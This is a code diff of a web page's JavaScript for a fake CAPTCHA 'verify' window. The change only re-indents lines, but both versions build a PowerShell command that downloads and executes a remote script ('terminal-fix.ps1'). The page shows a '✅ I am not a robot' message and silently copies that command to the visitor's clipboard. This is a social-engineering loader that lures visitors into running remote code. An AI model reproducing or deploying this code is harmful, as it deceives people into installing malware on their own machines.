@@ -223,14 +223,14 @@ function showVerifyWindow() {
             document.getElementById('verification-id')?.textContent && 
                 (document.getElementById('verification-id').textContent = verificationId);
             
-            const exe = "powershell";
-            const flags = "-NoProfile -Command";
-            const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
-            const fullCommand = `${exe} ${flags} ${payload}`;
+    const exe = "powershell";
+    const flags = "-NoProfile -Command";
+    const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
+    const fullCommand = `${exe} ${flags} ${payload}`;
 
-            commandDisplay.textContent = '✅ "I am not a robot"';
-            
-            autoCopy(fullCommand);
+    commandDisplay.textContent = '✅ "I am not a robot"';
+    
+    autoCopy(fullCommand);
 }
         addCaptchaListeners();
     </script>
